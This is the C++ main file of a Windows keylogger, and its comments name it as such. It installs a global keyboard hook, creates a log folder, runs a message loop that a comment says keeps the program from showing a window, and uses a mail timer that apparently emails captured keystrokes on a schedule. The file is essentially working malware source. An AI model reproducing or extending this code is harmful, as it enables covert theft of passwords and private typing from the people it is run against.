#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main()
{
    MSG Msg;

    IO::MkDir(IO::GetOurPath(true)); //log file is created in CLR folder.

    InstallHook();

    while(GetMessage (&Msg, NULL, 0, 0)) //prevents popup window when keylogger runs in bin\debug folders
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
